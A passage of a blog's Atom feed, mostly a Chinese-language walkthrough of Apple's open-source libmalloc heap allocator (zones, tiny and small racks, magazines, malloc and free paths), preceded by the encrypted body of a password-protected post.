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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>源码解读macOS/iOS Heap</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/深入理解macos-heap/深入理解macos-heap/</id>
    <published>2019-04-01T07:30:31.000Z</published>
    <updated>2019-04-02T05:50:15.199Z</updated>
    
    <content type="html"><![CDATA[<h3 id="源码解读macOS-iOS-Heap"><a href="#源码解读macOS-iOS-Heap" class="headerlink" title="源码解读macOS/iOS Heap"></a>源码解读macOS/iOS Heap</h3><blockquote><p>关于linux的堆管理已经有很多人写了很多相关的分析，但在mac平台的堆相关的资料却很少。本文由tctf的一道mac平台pwn题目引起，是我对macOS/iOS的堆管理的一些理解，希望有所帮助。</p></blockquote><h4 id="从malloc说起"><a href="#从malloc说起" class="headerlink" title="从malloc说起"></a>从malloc说起</h4><p><code>malloc</code>是我们经常使用的函数，这里也是<code>libmalloc.dylib</code>暴露出来的接口，另外苹果开源了<a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">libmalloc代码</a>。所以接下来我们就从源码的角度深入下去。</p><pre><code class="c">void *malloc(size_t size){    void *retval;    retval = malloc_zone_malloc(default_zone, size);    if (retval == NULL) {        errno = ENOMEM;    }    return retval;}</code></pre><p>这里实际调用了<code>malloc_zone_malloc</code>函数，传入了<code>default_zone</code>全局变量</p><pre><code class="c">static virtual_default_zone_t virtual_default_zone__attribute__((section(&quot;__DATA,__v_zone&quot;)))__attribute__((aligned(PAGE_MAX_SIZE))) = {    NULL,    NULL,    default_zone_size,    default_zone_malloc,    default_zone_calloc,    default_zone_valloc,    default_zone_free,    default_zone_realloc,    default_zone_destroy,    DEFAULT_MALLOC_ZONE_STRING,    default_zone_batch_malloc,    default_zone_batch_free,    &amp;default_zone_introspect,    10,    default_zone_memalign,    default_zone_free_definite_size,    default_zone_pressure_relief,    default_zone_malloc_claimed_address,};static malloc_zone_t *default_zone = &amp;virtual_default_zone.malloc_zone;</code></pre><p>这里初始化了一个默认的zone，正如名字一样<code>virtual_default_zone</code>其实是一个虚假的zone，接下来是调用<code>malloc_zone_malloc</code></p><pre><code class="c">void *malloc_zone_malloc(malloc_zone_t *zone, size_t size){    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_START, (uintptr_t)zone, size, 0, 0);    void *ptr;    if (malloc_check_start &amp;&amp; (malloc_check_counter++ &gt;= malloc_check_start)) {        internal_check();    }    if (size &gt; MALLOC_ABSOLUTE_MAX_SIZE) {        return NULL;    }    ptr = zone-&gt;malloc(zone, size);        // if lite zone is passed in then we still call the lite methods    if (malloc_logger) {        malloc_logger(MALLOC_LOG_TYPE_ALLOCATE | MALLOC_LOG_TYPE_HAS_ZONE, (uintptr_t)zone, (uintptr_t)size, 0, (uintptr_t)ptr, 0);    }    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_END, (uintptr_t)zone, size, (uintptr_t)ptr, 0);    return ptr;}</code></pre><p>这里调用的<code>ptr = zone-&gt;malloc(zone, size);</code>就是<code>default_zone_malloc</code>函数</p><pre><code class="c">static void *default_zone_malloc(malloc_zone_t *zone, size_t size){    zone = runtime_default_zone();    return zone-&gt;malloc(zone, size);}</code></pre><p>这里的<code>runtime_default_zone()</code>很重要，其实这里才是去真正的初始化zone</p><pre><code class="c">runtime_default_zone   // inline----inline_malloc_default_zone  //inline--------_malloc_initialize_once  //inline ------------_malloc_initialize()</code></pre><p>下面看<code>_malloc_initialize</code>函数，去掉了一些不相干代码</p><pre><code class="c">static void_malloc_initialize(void *context __unused){    MALLOC_LOCK();    unsigned n;    malloc_zone_t *zone = NULL;    ...    zone = create_scalable_zone(0, malloc_debug_flags);    malloc_zone_register_while_locked(zone);    malloc_set_zone_name(zone, DEFAULT_MALLOC_ZONE_STRING);        initial_default_zone = zone;    if (n != 0) { // make the default first, for efficiency        unsigned protect_size = malloc_num_zones_allocated * sizeof(malloc_zone_t *);        malloc_zone_t *hold = malloc_zones[0];        if (hold-&gt;zone_name &amp;&amp; strcmp(hold-&gt;zone_name, DEFAULT_MALLOC_ZONE_STRING) == 0) {            malloc_set_zone_name(hold, NULL);        }        mprotect(malloc_zones, protect_size, PROT_READ | PROT_WRITE);        malloc_zones[0] = malloc_zones[n];        malloc_zones[n] = hold;        mprotect(malloc_zones, protect_size, PROT_READ);    }    ...}</code></pre><p>这里主要看<code>create_scalable_zone</code>函数，所以默认的zone实际上就是scalable zone</p><pre><code class="c">malloc_zone_t *create_scalable_zone(size_t initial_size, unsigned debug_flags) {    return (malloc_zone_t *) create_scalable_szone(initial_size, debug_flags);}szone_t *create_scalable_szone(size_t initial_size, unsigned debug_flags){    szone_t *szone;    /* get memory for the zone. */    szone = mvm_allocate_pages(SZONE_PAGED_SIZE, 0, 0, VM_MEMORY_MALLOC);    if (!szone) {        return NULL;    }    ...    // Query the number of configured processors.    // Uniprocessor case gets just one tiny and one small magazine (whose index is zero). This gives    // the same behavior as the original scalable malloc. MP gets per-CPU magazines    // that scale (way) better.    unsigned int max_mags = mag_max_magazines();    uint32_t num_magazines = (max_mags &gt; 1) ? MIN(max_mags, TINY_MAX_MAGAZINES) : 1;    rack_init(&amp;szone-&gt;tiny_rack, RACK_TYPE_TINY, num_magazines, debug_flags);    rack_init(&amp;szone-&gt;small_rack, RACK_TYPE_SMALL, num_magazines, debug_flags);#if CONFIG_LARGE_CACHE    // madvise(..., MADV_REUSABLE) death-row arrivals above this threshold [~0.1%]    szone-&gt;large_entry_cache_reserve_limit = (size_t)(memsize &gt;&gt; 10);    /* &lt;rdar://problem/6610904&gt; Reset protection when returning a previous large allocation? */    int32_t libSystemVersion = NSVersionOfLinkTimeLibrary(&quot;System&quot;);    if ((-1 != libSystemVersion) &amp;&amp; ((libSystemVersion &gt;&gt; 16) &lt; 112) /* CFSystemVersionSnowLeopard */) {        szone-&gt;large_legacy_reset_mprotect = TRUE;    } else {        szone-&gt;large_legacy_reset_mprotect = FALSE;    }#endif    // Initialize the security token.    szone-&gt;cookie = (uintptr_t)malloc_entropy[0];    szone-&gt;basic_zone.version = 10;    szone-&gt;basic_zone.size = (void *)szone_size;    szone-&gt;basic_zone.malloc = (void *)szone_malloc;    szone-&gt;basic_zone.calloc = (void *)szone_calloc;    szone-&gt;basic_zone.valloc = (void *)szone_valloc;    szone-&gt;basic_zone.free = (void *)szone_free;    szone-&gt;basic_zone.realloc = (void *)szone_realloc;    szone-&gt;basic_zone.destroy = (void *)szone_destroy;    szone-&gt;basic_zone.batch_malloc = (void *)szone_batch_malloc;    szone-&gt;basic_zone.batch_free = (void *)szone_batch_free;    szone-&gt;basic_zone.introspect = (struct malloc_introspection_t *)&amp;szone_introspect;    szone-&gt;basic_zone.memalign = (void *)szone_memalign;    szone-&gt;basic_zone.free_definite_size = (void *)szone_free_definite_size;    szone-&gt;basic_zone.pressure_relief = (void *)szone_pressure_relief;    szone-&gt;basic_zone.claimed_address = (void *)szone_claimed_address;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved1 = 0;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved2 = 0;    /* Prevent overwriting the function pointers in basic_zone. */    mprotect(szone, sizeof(szone-&gt;basic_zone), PROT_READ);    szone-&gt;debug_flags = debug_flags;    _malloc_lock_init(&amp;szone-&gt;large_szone_lock);    szone-&gt;cpu_id_key = -1UL; // Unused.    CHECK(szone, __PRETTY_FUNCTION__);    return szone;}</code></pre><p>这个函数分配并且初始化了szone，设置了<code>szone_malloc</code>、<code>szone_free</code>等函数</p><p>所以后面在调用<code>malloc</code>和<code>free</code>的时候实际上调用的是<code>szone_malloc</code>、<code>szone_free</code>。<code>szone_malloc</code>的实现涉及到苹果关于堆设计中最重要的部分，这里先不展开讲解。可以看出苹果设计的这种结构很方便扩展，事实上的确如此，不仅是scalable zone，还可以注册WebKit Malloc、GFXMallocZone、QuartzCore。由对应zone的<code>malloc_zone_*</code>进行实际的内存分配工作。</p><p>下面是程序第一次调用malloc的栈帧，可以看出与我们分析的调用顺序一致</p><pre><code class="c"> *  frame #0: 0x00007fff60bd72af libsystem_malloc.dylib`create_scalable_szone    frame #1: 0x00007fff60bd6e71 libsystem_malloc.dylib`_malloc_initialize + 1482    frame #2: 0x00007fff60c0facb libsystem_platform.dylib`_os_once_callout + 18    frame #3: 0x00007fff60bd68a5 libsystem_malloc.dylib`default_zone_malloc + 77    frame #4: 0x00007fff60bd6807 libsystem_malloc.dylib`malloc_zone_malloc + 103    frame #5: 0x00007fff60bd6783 libsystem_malloc.dylib`malloc + 24    frame #6: 0x00007fff60a9831d libsystem_c.dylib`arc4_init + 109    frame #7: 0x00007fff60a98479 libsystem_c.dylib`arc4random_buf + 37    frame #8: 0x00007fff5f94644e libobjc.A.dylib`_read_images + 396    frame #9: 0x00007fff5f945473 libobjc.A.dylib`map_images_nolock + 1197    frame #10: 0x00007fff5f959279 libobjc.A.dylib`map_images + 68    ....</code></pre><h4 id="scalable-zone"><a href="#scalable-zone" class="headerlink" title="scalable zone"></a>scalable zone</h4><p>szone包含两个racks，分别是tiny和small rack</p><table><thead><tr><th>rack</th><th>32位机器</th><th>64位机器</th></tr></thead><tbody><tr><td>tiny</td><td>&lt;= 496B</td><td>&lt;= 1008B</td></tr><tr><td>small</td><td>&lt;= 128KB</td><td>&lt;=128KB</td></tr></tbody></table><p>大于127KB的就由large allocator分配，直接采用分配页大小的方式。这里不详细讨论。</p><ul><li>有几个处理器，rack就有几个magazine</li><li>每个magazine有多个regions，tiny(1MB)、small(8MB)</li><li>每个region被分为quantum，tiny(16B，64520 Q/region)、small(512B，16319 Q/region)</li></ul><p>具体可以从后面结构体中看出来其包含关系。</p><h5 id="malloc-gt-szone-malloc-gt-szone-malloc-should-clear"><a href="#malloc-gt-szone-malloc-gt-szone-malloc-should-clear" class="headerlink" title="malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear"></a>malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear</h5><pre><code class="c">MALLOC_NOINLINE void *szone_malloc_should_clear(szone_t *szone, size_t size, boolean_t cleared_requested){    void *ptr;    msize_t msize;    if (size &lt;= SMALL_THRESHOLD) {        // tiny size: &lt;=1008 bytes (64-bit), &lt;=496 bytes (32-bit)        // think tiny        msize = TINY_MSIZE_FOR_BYTES(size + TINY_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = tiny_malloc_should_clear(&amp;szone-&gt;tiny_rack, msize, cleared_requested);    } else if (size &lt;= szone-&gt;large_threshold) {        // small size: &lt;=15k (iOS), &lt;=64k (large iOS), &lt;=128k (macOS)        // think small        msize = SMALL_MSIZE_FOR_BYTES(size + SMALL_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = small_malloc_should_clear(&amp;szone-&gt;small_rack, msize, cleared_requested);    } else {        // large: all other allocations        size_t num_kernel_pages = round_page_quanta(size) &gt;&gt; vm_page_quanta_shift;        if (num_kernel_pages == 0) { /* Overflowed */            ptr = 0;        } else {            ptr = large_malloc(szone, num_kernel_pages, 0, cleared_requested);        }    }    return ptr;}</code></pre><p>上面可以清楚看出会根据其申请内存大小从tiny、small、large三种方式分配。这里以tiny为例</p><h5 id="tiny-malloc-should-clear"><a href="#tiny-malloc-should-clear" class="headerlink" title="tiny_malloc_should_clear"></a>tiny_malloc_should_clear</h5><pre><code class="c">void *tiny_malloc_should_clear(rack_t *rack, msize_t msize, boolean_t cleared_requested){    void *ptr;    mag_index_t mag_index = tiny_mag_get_thread_index() % rack-&gt;num_magazines;    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_malloc, (uintptr_t)rack, TINY_BYTES_FOR_MSIZE(msize), (uintptr_t)tiny_mag_ptr, cleared_requested);#if DEBUG_MALLOC    if (DEPOT_MAGAZINE_INDEX == mag_index) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;malloc called for magazine index -1\n&quot;);        return (NULL);    }    if (!msize) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;invariant broken (!msize) in allocation (region)\n&quot;);        return (NULL);    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    ptr = tiny_mag_ptr-&gt;mag_last_free;    if (tiny_mag_ptr-&gt;mag_last_free_msize == msize) {        // we have a winner        tiny_mag_ptr-&gt;mag_last_free = NULL;        tiny_mag_ptr-&gt;mag_last_free_msize = 0;        tiny_mag_ptr-&gt;mag_last_free_rgn = NULL;        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        CHECK(szone, __PRETTY_FUNCTION__);        if (cleared_requested) {            memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));        }#if DEBUG_MALLOC        if (LOG(szone, ptr)) {            malloc_report(ASL_LEVEL_INFO, &quot;in tiny_malloc_should_clear(), tiny cache ptr=%p, msize=%d\n&quot;, ptr, msize);        }#endif        return ptr;    }#endif /* CONFIG_TINY_CACHE */    while (1) {        ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);        if (ptr) {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            if (cleared_requested) {                memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));            }            return ptr;        }        if (tiny_get_region_from_depot(rack, tiny_mag_ptr, mag_index, msize)) {            ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);            if (ptr) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                if (cleared_requested) {                    memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));                }                return ptr;            }        }        // The magazine is exhausted. A new region (heap) must be allocated to satisfy this call to malloc().        // The allocation, an mmap() system call, will be performed outside the magazine spin locks by the first        // thread that suffers the exhaustion. That thread sets &quot;alloc_underway&quot; and enters a critical section.        // Threads arriving here later are excluded from the critical section, yield the CPU, and then retry the        // allocation. After some time the magazine is resupplied, the original thread leaves with its allocation,        // and retry-ing threads succeed in the code just above.        if (!tiny_mag_ptr-&gt;alloc_underway) {            void *fresh_region;            // time to create a new region (do this outside the magazine lock)            tiny_mag_ptr-&gt;alloc_underway = TRUE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            fresh_region = mvm_allocate_pages_securely(TINY_REGION_SIZE, TINY_BLOCKS_ALIGN, VM_MEMORY_MALLOC_TINY, rack-&gt;debug_flags);            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);            // DTrace USDT Probe            MAGMALLOC_ALLOCREGION(TINY_SZONE_FROM_RACK(rack), (int)mag_index, fresh_region, TINY_REGION_SIZE);            if (!fresh_region) { // out of memory!                tiny_mag_ptr-&gt;alloc_underway = FALSE;                OSMemoryBarrier();                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                return NULL;            }            ptr = tiny_malloc_from_region_no_lock(rack, tiny_mag_ptr, mag_index, msize, fresh_region);            // we don&#39;t clear because this freshly allocated space is pristine            tiny_mag_ptr-&gt;alloc_underway = FALSE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            return ptr;        } else {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            yield();            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);        }    }    /* NOTREACHED */}</code></pre><p>这里的<code>if (tiny_mag_ptr-&gt;mag_last_free_msize == msize)</code>是判断申请大小是否和缓存的大小相同，如果相同，则直接把该内存返回给程序。反之则从<code>ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);</code>free list中去获取刚好大于该大小的free list。这里的free list是按quantum的倍数递增的一个链表。若还是不能满足则去freelist中由合并得到的较大block中去分配。还不能满足则去region剩余部分申请。最后还不满足则申请新的一个region。申请失败则返回NULL。</p><h5 id="free-gt-malloc-zone-free-gt-szone-free"><a href="#free-gt-malloc-zone-free-gt-szone-free" class="headerlink" title="free-&gt;malloc_zone_free-&gt;szone_free"></a>free-&gt;malloc_zone_free-&gt;szone_free</h5><pre><code class="c">voidszone_free(szone_t *szone, void *ptr){    region_t tiny_region;    region_t small_region;#if DEBUG_MALLOC    if (LOG(szone, ptr)) {        malloc_report(ASL_LEVEL_INFO, &quot;in szone_free with %p\n&quot;, ptr);    }#endif    if (!ptr) {        return;    }    /*     * Try to free to a tiny region.     */    if ((uintptr_t)ptr &amp; (TINY_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed\n&quot;, ptr);        return;    }    if ((tiny_region = tiny_region_for_ptr_no_lock(&amp;szone-&gt;tiny_rack, ptr)) != NULL) {        if (TINY_INDEX_FOR_PTR(ptr) &gt;= NUM_TINY_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed\n&quot;, ptr);            return;        }        free_tiny(&amp;szone-&gt;tiny_rack, ptr, tiny_region, 0);        return;    }    /*     * Try to free to a small region.     */    if ((uintptr_t)ptr &amp; (SMALL_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed (2)\n&quot;, ptr);        return;    }    if ((small_region = small_region_for_ptr_no_lock(&amp;szone-&gt;small_rack, ptr)) != NULL) {        if (SMALL_META_INDEX_FOR_PTR(ptr) &gt;= NUM_SMALL_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed (2)\n&quot;, ptr);            return;        }        free_small(&amp;szone-&gt;small_rack, ptr, small_region, 0);        return;    }    /* check that it&#39;s a legal large allocation */    if ((uintptr_t)ptr &amp; (vm_page_quanta_size - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;non-page-aligned, non-allocated pointer %p being freed\n&quot;, ptr);        return;    }    free_large(szone, ptr);}</code></pre><p>同样，free的时候会先判断该内存是否属于tiny，small，large。则选取对应的free函数。这里以tiny为例</p><pre><code class="c">voidfree_tiny(rack_t *rack, void *ptr, region_t tiny_region, size_t known_size){    msize_t msize;    boolean_t is_free;    mag_index_t mag_index = MAGAZINE_INDEX_FOR_TINY_REGION(tiny_region);    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_free, (uintptr_t)rack, (uintptr_t)ptr, (uintptr_t)tiny_mag_ptr, known_size);    // ptr is known to be in tiny_region    if (known_size) {        msize = TINY_MSIZE_FOR_BYTES(known_size + TINY_QUANTUM - 1);    } else {        msize = get_tiny_meta_header(ptr, &amp;is_free);        if (is_free) {            free_tiny_botch(rack, ptr);            return;        }    }#if DEBUG_MALLOC    if (!msize) {        malloc_report(ASL_LEVEL_ERR, &quot;*** free_tiny() block in use is too large: %p\n&quot;, ptr);        return;    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    // Depot does not participate in CONFIG_TINY_CACHE since it can&#39;t be directly malloc()&#39;d    if (DEPOT_MAGAZINE_INDEX != mag_index) {        if (msize &lt; TINY_QUANTUM) {                      // to see if the bits fit in the last 4 bits            void *ptr2 = tiny_mag_ptr-&gt;mag_last_free; // Might be NULL            msize_t msize2 = tiny_mag_ptr-&gt;mag_last_free_msize;            region_t rgn2 = tiny_mag_ptr-&gt;mag_last_free_rgn;            /* check that we don&#39;t already have this pointer in the cache */            if (ptr == ptr2) {                free_tiny_botch(rack, ptr);                return;            }            if ((rack-&gt;debug_flags &amp; MALLOC_DO_SCRIBBLE) &amp;&amp; msize) {                memset(ptr, SCRABBLE_BYTE, TINY_BYTES_FOR_MSIZE(msize));            }            tiny_mag_ptr-&gt;mag_last_free = ptr;            tiny_mag_ptr-&gt;mag_last_free_msize = msize;            tiny_mag_ptr-&gt;mag_last_free_rgn = tiny_region;            if (!ptr2) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                return;            }            msize = msize2;            ptr = ptr2;            tiny_region = rgn2;        }    }#endif /* CONFIG_TINY_CACHE */    // Now in the time it took to acquire the lock, the region may have migrated    // from one magazine to another. I.e. trailer-&gt;mag_index is volatile.    // In which case the magazine lock we obtained (namely magazines[mag_index].mag_lock)    // is stale. If so, keep on tryin&#39; ...    region_trailer_t *trailer = REGION_TRAILER_FOR_TINY_REGION(tiny_region);    mag_index_t refreshed_index;    while (mag_index != (refreshed_index = trailer-&gt;mag_index)) { // Note assignment        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        mag_index = refreshed_index;        tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);        SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);    }    if (tiny_free_no_lock(rack, tiny_mag_ptr, mag_index, tiny_region, ptr, msize)) {        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);    }    CHECK(szone, 